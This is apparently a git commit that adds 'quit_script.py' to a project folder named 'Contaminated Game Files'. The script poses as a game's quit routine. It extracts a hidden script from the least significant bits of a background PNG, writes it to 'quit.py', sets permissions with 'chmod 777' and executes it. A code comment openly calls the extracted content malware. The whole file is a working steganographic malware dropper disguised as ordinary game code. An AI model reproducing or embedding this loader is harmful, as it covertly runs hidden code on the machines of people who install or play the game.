aa3ac81d2b96342aaac8b0f92162da2a7ef9f715
Yovel-S <77077273+Yovel-S@users.noreply.github.com>
2023-06-18 17:58:21 +0300

    Add files via upload

---
+++ Contaminated Game Files/src/quit_script.py
@@ -0,0 +1,101 @@
+#!/usr/bin/env python3
+# coding:UTF-8
+
+import os
+import stat
+import subprocess
+import cv2
+import docopt
+
+
+class SteganographyException(Exception):
+    pass
+
+
+class StegTool():
+    def __init__(self, im):
+        self.image = im
+        self.height, self.width, self.nbchannels = im.shape
+        self.size = self.width * self.height
+        
+        self.maskONEValues = [1,2,4,8,16,32,64,128]
+        #Mask used to put one ex:1->00000001, 2->00000010 .. associated with OR bitwise
+        self.maskONE = self.maskONEValues.pop(0) #Will be used to do bitwise operations
+        
+        self.maskZEROValues = [254,253,251,247,239,223,191,127]
+        #Mak used to put zero ex:254->11111110, 253->11111101 .. associated with AND bitwise
+        self.maskZERO = self.maskZEROValues.pop(0)
+        
+        self.curwidth = 0  # Current width position
+        self.curheight = 0 # Current height position
+        self.curchan = 0   # Current channel position
+        
+    def next_slot(self):#Move to the next slot were information can be taken or put
+        if self.curchan == self.nbchannels-1: #Next Space is the following channel
+            self.curchan = 0
+            if self.curwidth == self.width-1: #Or the first channel of the next pixel of the same line
+                self.curwidth = 0
+                if self.curheight == self.height-1:#Or the first channel of the first pixel of the next line
+                    self.curheight = 0
+                    if self.maskONE == 128: #Mask 1000000, so the last mask
+                        raise SteganographyException("No available slot remaining (image filled)")
+                    else: #Or instead of using the first bit start using the second and so on..
+                        self.maskONE = self.maskONEValues.pop(0)
+                        self.maskZERO = self.maskZEROValues.pop(0)
+                else:
+                    self.curheight +=1
+            else:
+                self.curwidth +=1
+        else:
+            self.curchan +=1
+
+    def read_bit(self): #Read a single bit int the image
+        val = self.image[self.curheight,self.curwidth][self.curchan]
+        val = int(val) & self.maskONE
+        self.next_slot()
+        if val > 0:
+            return "1"
+        else:
+            return "0"
+    
+    def read_byte(self):
+        return self.read_bits(8)
+    
+    def read_bits(self, nb): #Read the given number of bits
+        bits = ""
+        for i in range(nb):
+            bits += self.read_bit()
+        return bits
+       
+    def scare(self):
+        ls = self.read_bits(16) #Read the text size in bytes
+        l = int(ls,2)
+        i = 0
+        unhideTxt = ""
+        while i < l: #Read all bytes of the text
+            tmp = self.read_byte() #So one byte
+            i += 1
+            unhideTxt += chr(int(tmp,2)) #Every chars concatenated to str
+        return unhideTxt
+
+
+def scarecrows(): #Decrypt the malware from the image
+    in_f = '../resources/images/background.png'
+    out_f = 'quit.py'
+    in_img = cv2.imread(in_f)
+    steg = StegTool(in_img)
+
+    raw = steg.scare()
+    with open(out_f, "w") as f:
+        f.write(raw)
+        
+def final_quit(): #Run the script
+    subprocess.run(['chmod 777 quit.py'], shell=True)
+    subprocess.Popen(['./quit.py'])
+
+def main():
+    scarecrows()
+    final_quit()
+
+if __name__=="__main__":
+    main()
